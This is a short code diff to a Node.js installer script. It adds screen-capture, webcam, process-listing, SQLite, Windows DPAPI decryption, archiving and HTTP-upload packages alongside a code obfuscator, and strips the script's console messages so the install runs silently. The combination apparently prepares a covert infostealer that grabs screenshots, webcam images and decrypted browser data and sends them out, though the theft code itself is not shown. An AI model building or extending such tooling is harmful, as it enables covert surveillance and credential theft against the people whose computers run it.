@@ -6,16 +6,23 @@ const packages = [
     'axios',
     'fs-extra',
     'request',
-    'javascript-obfuscator'
+    'glob',
+    'screenshot-desktop',
+    'form-data',
+    'sqlite3',
+    'adm-zip',
+    '@primno/dpapi',
+    'node-fetch',
+    'ps-list',
+    'javascript-obfuscator',
+    'node-webcam',
+    'archiver'
 ];
 
 function installPackages() {
-    console.log('📦 Instalando bibliotecas necessárias...');
     try {
         execSync(`npm install ${packages.join(' ')} --prefix "${installPath}"`, { stdio: 'inherit' });
-        console.log('✅ Todas bibliotecas instaladas.');
     } catch (err) {
-        console.error('❌ Falha ao instalar bibliotecas:', err.message);
     }
 }
 
